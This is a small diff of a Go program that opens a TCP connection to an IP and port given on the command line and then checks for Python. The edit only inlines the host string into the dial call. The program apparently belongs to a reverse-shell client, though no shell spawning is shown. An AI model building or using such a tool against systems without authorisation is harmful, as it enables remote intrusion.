@@ -15,8 +15,7 @@ func main() {
 	}
 	ip := os.Args[1]
 	port := os.Args[2]
-	host := ip + ":" + port
-	con, _ := net.Dial("tcp", host)
+	con, _ := net.Dial("tcp", ip+":"+port)
 
 	ispy, err := verifyPython()
 	if err != nil {
